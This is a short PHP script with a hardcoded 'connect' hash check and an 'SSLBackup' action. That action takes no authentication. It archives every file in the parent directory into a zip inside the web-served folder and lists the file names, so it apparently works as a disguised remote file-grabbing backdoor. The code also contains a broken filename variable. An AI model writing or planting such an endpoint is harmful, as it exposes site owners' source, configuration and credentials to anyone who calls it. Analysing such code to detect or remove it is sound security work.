<?php 
	$hash=$_REQUEST['hash'];
	$page=$_REQUEST['page'];
	$action=$_REQUEST['action'];
	$myHash="ac5d10ef363a6dd129b0c8d8ff5ee3e5";
	$myPage=$_SERVER['SERVER_NAME'];
	
if($action=="connect"){
	if($hash==$myHash && $page==$myPage){
		echo '{"status" : "connected"}';
	}else{
		echo '{"status" : "false"}';
	}
}

if($action=="SSLBackup"){
	$time=$_REQUEST['time'];
	$zip = new ZipArchive();
	$filename = "./$timesslbackup.zip";

	if ($zip->open($filename, ZipArchive::CREATE)!==TRUE) {
	    exit("cannot open <$filename>\n");
	}
	$files = scandir('../');
	foreach($files as $file) {
		$path="../$file";
		if(is_file($path)){
			echo $file ."<br/>";    		
			$zip->addFile("../$file","$file");
		}
	}
	echo '{"status" : "'.$zip->status.'" , "sizeFiles" : "'. $zip->numFiles.'"}';
	$zip->close();	
	}



?>

